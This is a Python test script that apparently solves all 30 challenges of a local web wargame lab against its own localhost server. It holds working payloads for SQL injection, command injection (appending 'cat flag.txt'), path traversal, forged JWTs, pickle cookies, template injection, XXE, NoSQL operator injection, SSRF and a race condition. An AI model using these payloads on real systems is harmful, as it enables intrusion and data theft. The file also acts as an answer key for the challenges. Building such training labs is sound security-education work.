"""End-to-end solver tests for Mini Web Wargame 30.

Run from this directory:
    python test_challenges.py
"""

from __future__ import annotations

import base64
import json
import pickle
import platform
import re
import string
import threading
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from http.cookiejar import CookieJar
from types import SimpleNamespace

import challenges
import config
import server
from http.server import ThreadingHTTPServer

HOST = "127.0.0.1"


def start_server():
    server.prepare()
    httpd = ThreadingHTTPServer((HOST, 0), server.Handler)
    port = httpd.server_address[1]
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    return httpd, port


def request(port, path, method="GET", data=None, headers=None, jar=None):
    url = f"http://{HOST}:{port}{path}"
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    if jar is not None:
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    else:
        opener = urllib.request.build_opener()
    try:
        with opener.open(req, timeout=15) as resp:
            return resp.status, resp.read().decode("utf-8", "replace"), resp.headers
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace"), exc.headers


def get(port, path, headers=None, jar=None):
    return request(port, path, headers=headers, jar=jar)


def post_form(port, path, fields, jar=None, headers=None):
    body = urllib.parse.urlencode(fields).encode()
    merged = {"Content-Type": "application/x-www-form-urlencoded"}
    if headers:
        merged.update(headers)
    return request(port, path, method="POST", data=body, headers=merged, jar=jar)


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def make_none_token(payload: dict) -> str:
    header = {"alg": "none", "typ": "JWT"}
    head = b64url(json.dumps(header, separators=(",", ":")).encode())
    body = b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{head}.{body}."


def flag(cid: int) -> str:
    return config.FLAGS[cid]


def test_source(port):
    _, body, _ = get(port, "/c/source-comment/")
    assert flag(1) in body


def test_robots(port):
    _, robots, _ = get(port, "/robots.txt")
    assert "/c/robots/secret/" in robots
    _, body, _ = get(port, "/c/robots/secret/")
    assert flag(2) in body
    # Shortened or manually edited URLs should still reach the challenge.
    _, body, _ = get(port, "/robots/secret/")
    assert flag(2) in body
    _, body, _ = get(port, "/c//ROBOTS//secret//")
    assert flag(2) in body
    _, body, _ = get(port, "/c/robots.txt/secret/")
    assert flag(2) in body


def test_files(port):
    _, listing, _ = get(port, "/c/files/")
    assert "hidden.txt" in listing
    _, body, _ = get(port, "/c/files/hidden.txt")
    assert flag(3) in body


def test_cookie(port):
    _, body, _ = get(port, "/c/cookie/", headers={"Cookie": "admin=1"})
    assert flag(4) in body


def test_referer(port):
    _, body, _ = get(
        port,
        "/c/referer/",
        headers={"Referer": f"http://{HOST}:{port}/c/referer/portal"},
    )
    assert flag(5) in body


def test_hidden(port):
    _, body, _ = post_form(port, "/c/hidden/", {"name": "guest", "debug": "1"})
    assert flag(6) in body


def test_js(port):
    _, body, _ = get(port, "/c/js/")
    assert flag(7) in body


def test_base64(port):
    _, body, _ = get(port, "/c/base64/", headers={"Cookie": "role=YWRtaW4="})
    assert flag(8) in body


def test_traversal(port):
    query = urllib.parse.urlencode({"file": "../flag.txt"})
    _, body, _ = get(port, f"/c/traversal/?{query}")
    assert flag(9) in body


def test_ua(port):
    _, body, _ = get(port, "/c/ua/", headers={"User-Agent": "WargameBot/1.0"})
    assert flag(10) in body


def test_sqli_login(port):
    _, body, _ = post_form(
        port,
        "/c/sqli-login/",
        {"username": "' OR 1=1 -- ", "password": "x"},
    )
    assert flag(11) in body


def test_sqli_union(port):
    payload = "0 UNION SELECT 'x', flag FROM secrets"
    _, body, _ = get(port, "/c/sqli-union/?" + urllib.parse.urlencode({"id": payload}))
    assert flag(12) in body


def test_blind(port):
    # Verify every known character can be tested through the boolean oracle.
    for index, character in enumerate(flag(13), start=1):
        payload = f"1 AND (SELECT substr(flag,{index},1) FROM secrets)='{character}'"
        _, body, _ = get(port, "/c/blind/?" + urllib.parse.urlencode({"id": payload}))
        assert "not exists" not in body, (index, character)
    wrong = "1 AND (SELECT substr(flag,1,1) FROM secrets)='Z'"
    _, body, _ = get(port, "/c/blind/?" + urllib.parse.urlencode({"id": wrong}))
    assert "not exists" in body


def test_ping(port):
    if platform.system() == "Windows":
        host = "127.0.0.1 & type flag.txt"
    else:
        host = "127.0.0.1; cat flag.txt"
    _, body, _ = get(port, "/c/ping/?" + urllib.parse.urlencode({"host": host}))
    assert flag(14) in body


def test_lfi(port):
    _, body, _ = get(port, "/c/lfi/?page=....//flag.txt")
    assert flag(15) in body


def test_jwt_none(port):
    token = make_none_token({"user": "admin", "role": "admin"})
    _, body, _ = get(port, "/c/jwt-none/", headers={"Cookie": f"jwt_token={token}"})
    assert flag(16) in body


def test_idor(port):
    _, body, _ = get(port, "/c/idor/?user=2")
    assert flag(17) in body


def test_mass_assign(port):
    _, body, _ = post_form(
        port,
        "/c/mass-assign/",
        {"username": "newuser", "password": "pass", "role": "admin"},
    )
    assert flag(18) in body


def test_ssrf(port):
    inner = f"http://{HOST}:{port}/internal/flag"
    _, body, _ = get(port, "/c/ssrf/?" + urllib.parse.urlencode({"url": inner}))
    assert flag(19) in body


def test_hpp(port):
    body = b"username=guest&role=user&role=admin"
    _, page, _ = request(
        port,
        "/c/hpp/",
        method="POST",
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    assert flag(20) in page


def test_ssti(port):
    payload = "{{open('data/21/flag.txt').read()}}"
    _, body, _ = get(port, "/c/ssti/?" + urllib.parse.urlencode({"name": payload}))
    assert flag(21) in body


def test_pickle(port):
    obj = SimpleNamespace(username="admin", role="admin")
    token = base64.b64encode(pickle.dumps(obj)).decode()
    _, body, _ = get(port, "/c/pickle/", headers={"Cookie": f"data={token}"})
    assert flag(22) in body


def test_jwt_weak(port):
    token = challenges._jwt_encode({"user": "admin", "role": "admin"}, challenges.WEAK_SECRET)
    _, body, _ = get(port, "/c/jwt-weak/", headers={"Cookie": f"weak_token={token}"})
    assert flag(23) in body


def test_xxe(port):
    xml = (
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file://data/24/flag.txt">]>\n'
        "<root><name>&xxe;</name></root>"
    )
    _, body, _ = post_form(port, "/c/xxe/", {"xml": xml})
    assert flag(24) in body


def test_race(port):
    jar = CookieJar()
    status, _, _ = get(port, "/c/race/", jar=jar)
    assert status == 200
    sid = next(cookie.value for cookie in jar if cookie.name == "sid")

    def redeem(_):
        return request(
            port,
            "/c/race/redeem",
            method="POST",
            data=b"",
            headers={"Cookie": f"sid={sid}"},
        )

    with ThreadPoolExecutor(max_workers=24) as pool:
        list(pool.map(redeem, range(24)))

    status, body, _ = request(
        port,
        "/c/race/buy",
        method="POST",
        data=b"",
        headers={"Cookie": f"sid={sid}"},
    )
    assert status == 200
    assert flag(25) in body


def test_jwt_kid(port):
    token = challenges._jwt_encode(
        {"user": "admin", "role": "admin"},
        "public-key",
        extra={"kid": "../public.txt"},
    )
    _, body, _ = get(port, "/c/jwt-kid/", headers={"Cookie": f"kid_token={token}"})
    assert flag(26) in body


def test_sqli_waf(port):
    payload = "1/**/UNION/**/SELECT/**/1,flag/**/FROM/**/secrets"
    _, body, _ = get(port, "/c/sqli-waf/?" + urllib.parse.urlencode({"id": payload}))
    assert flag(27) in body


def test_nosql(port):
    payload = json.dumps({"username": "admin", "password": {"$ne": ""}})
    _, body, _ = post_form(port, "/c/nosql/", {"json": payload})
    assert flag(28) in body


def test_chain(port):
    jar = CookieJar()
    status, _, _ = post_form(
        port,
        "/c/chain/",
        {"username": "guest", "password": "guest"},
        jar=jar,
    )
    assert status == 200

    _, profile, _ = get(port, "/c/chain/profile?user=2", jar=jar)
    match = re.search(r"reset_token: <code>([^<]+)</code>", profile)
    assert match, profile[:500]
    token = match.group(1)

    status, _, _ = post_form(
        port,
        "/c/chain/reset",
        {"user": "2", "token": token, "newpass": "newpass"},
        jar=jar,
    )
    assert status == 200

    get(port, "/c/chain/logout", jar=jar)
    status, _, _ = post_form(
        port,
        "/c/chain/",
        {"username": "admin", "password": "newpass"},
        jar=jar,
    )
    assert status == 200

    _, admin_page, _ = get(port, "/c/chain/admin", jar=jar)
    assert flag(29) in admin_page


def test_oauth(port):
    jar = CookieJar()
    base = f"http://{HOST}:{port}"
    callback = f"{base}/c/oauth/callback?next={base}/c/oauth/leak"
    authorize = f"{base}/c/oauth/authorize?redirect_uri=" + urllib.parse.quote(callback, safe="")
    status, report, _ = post_form(port, "/c/oauth/report", {"url": authorize}, jar=jar)
    assert status == 200
    assert "봇 방문 완료" in report
    _, inbox, _ = get(port, "/c/oauth/inbox", jar=jar)
    assert flag(30) in inbox


TESTS = [
    ("01 source comment", test_source),
    ("02 robots.txt", test_robots),
    ("03 directory listing", test_files),
    ("04 cookie", test_cookie),
    ("05 referer", test_referer),
    ("06 hidden input", test_hidden),
    ("07 client-side JS", test_js),
    ("08 base64 cookie", test_base64),
    ("09 path traversal", test_traversal),
    ("10 user-agent", test_ua),
    ("11 SQLi login", test_sqli_login),
    ("12 UNION SQLi", test_sqli_union),
    ("13 blind SQLi", test_blind),
    ("14 command injection", test_ping),
    ("15 LFI bypass", test_lfi),
    ("16 JWT none", test_jwt_none),
    ("17 IDOR", test_idor),
    ("18 mass assignment", test_mass_assign),
    ("19 SSRF", test_ssrf),
    ("20 parameter pollution", test_hpp),
    ("21 SSTI", test_ssti),
    ("22 pickle", test_pickle),
    ("23 JWT weak secret", test_jwt_weak),
    ("24 XXE", test_xxe),
    ("25 race condition", test_race),
    ("26 JWT kid", test_jwt_kid),
    ("27 SQLi WAF", test_sqli_waf),
    ("28 NoSQL", test_nosql),
    ("29 chain", test_chain),
    ("30 OAuth redirect", test_oauth),
]


def main():
    httpd, port = start_server()
    passed = 0
    try:
        for name, fn in TESTS:
            fn(port)
            passed += 1
            print(f"PASS {name}")
        print(f"\n{passed}/{len(TESTS)} challenges solved")
    finally:
        httpd.shutdown()
        httpd.server_close()
    assert passed == len(TESTS)


if __name__ == "__main__":
    main()
